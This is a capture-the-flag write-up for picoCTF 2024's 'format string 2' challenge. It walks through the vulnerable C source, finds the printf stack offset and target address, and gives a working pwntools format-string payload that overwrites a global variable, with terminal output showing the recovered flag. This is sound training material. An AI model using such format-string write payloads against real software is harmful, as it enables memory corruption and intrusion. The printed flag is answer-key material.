### format string 2

Author: SkrubLawd
#Medium #Binary_exploitation #picoCTF2024 #format_string #browser_web_shell 
#### Description

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must _change_ data on the stack! Download the binary [here](https://artifacts.picoctf.net/c_rhea/14/vuln). Download the source [here](https://artifacts.picoctf.net/c_rhea/14/vuln.c).

Additional details will be available after launching your challenge instance.
Connect with the challenge instance here: `nc rhea.picoctf.net 63761`

##### Solution:
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}

```

```css
┌──(kali㉿kali)-[~/Downloads/format_string2]
└─$ ./vuln            
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
ttt
Here's your input: ttt
sus = 0x21737573
You can do better!   

```


The source code is below. If you change the variable sus from 0x21737573 to 0x67616c66, the flag will be displayed.

```c
#include <stdio.h>

// int sus = 0x21737573;
int sus = 0x67616c66;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

```css
┌──(kali㉿kali)-[~/Downloads/format_string2]
└─$ ./test           
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
lll
Here's your input: lll
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{format_string2}
```

Since printf (buf) is executed, FSB can be used.

To execute FSB, prepare the offset for printf execution, the address you want to write to, and the content you want to write.

The offset when executing printf is accessing the instance and increasing %n$p, n=14 becomes the offset of the format string. 

```css
┌──(kali㉿kali)-[~/Downloads/format_string2]
└─$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%1$p
Here's your input: 0x7ffc871d5ce0
sus = 0x21737573
You can do better!

┌──(kali㉿kali)-[~/Downloads/format_string2]
└─$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%14$p
Here's your input: 0x7024343125
sus = 0x21737573
You can do better!     
```

The address I want to write to is the SUS address, so when I check it with gdb, it is 0x404060.

```css
(gdb) p &sus
$1 = (<data variable, no debug info> *) 0x404060 <sus>
```
The value you want to write is 0x67616c66.
Use pwntools' fmtstr_payload to create a string that will be fed to printf. 

payload
```python
from pwn import *
context.arch = 'amd64'

payload = fmtstr_payload(14, {0x404060: 0x67616c66}, write_size='byte')
# generated_payload = b'%102c%16$llnc%17$hhn%5c%18$hhn%245c%19$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'
chall = process('./vuln')
log.info(chall.recvline())
chall.sendline(payload)
chall.interactive()
```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/format_string2]
└─$ python3 test1.py                              
[+] Starting local process './vuln': pid 55036
/home/kali/Downloads/myenv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code 0 (pid 55036)
Here's your input:                                                                                                       c    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{format_string2}
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

or
```python
from pwnlib.fmtstr import *
context.arch='amd64'
print(fmtstr_payload(14, {0x404060:0x67616c66}, numbwritten=0, write_size='byte').decode('utf-8'))
```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/format_string2]
└─$ python3 test2.py|./vuln 
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:                                                                                                       c                                                                                                                                                                                                                                                        aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{format_string2}

```

online on server

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/format_string2]
└─$ python3 test2.py| nc rhea.picoctf.net 63761
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:                                                                                                      uc                                                                                                                                                                                                                                                        aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}  
```